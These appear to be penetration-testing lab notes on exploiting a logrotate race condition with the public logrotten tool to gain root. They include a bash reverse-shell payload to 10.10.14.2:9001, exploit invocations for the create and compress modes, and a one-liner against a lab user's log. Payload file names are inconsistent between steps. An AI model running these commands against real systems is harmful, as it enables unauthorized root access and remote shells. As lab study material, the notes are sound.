This tool is usually started periodically via `cron` and controlled via the configuration file `/etc/logrotate.conf`.
To exploit `logrotate`, we need some requirements that we have to fulfill.
1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

https://github.com/whotwagner/logrotten
#### Get exploit and compile
```shell
 gcc logrotten.c -o logrotten
```
#### Prepare payload
```shell
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```
#### Determine option and exploit
Look in logrogate.conf file or .cfg file to see if the create or the compress option is used.

For create: 
```shell
./logrotten -p ./payloadfile /tmp/log/pwnme.log
```

For compress:
```shell
./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
```

#### One liner
```shell
 echo HACKED >> /home/htb-student/backups/access.log ; ./logrotten -p ./payload.sh -c -s 4 /home/htb-student/backups/access.log
```
Execute it until the race condition is triggered.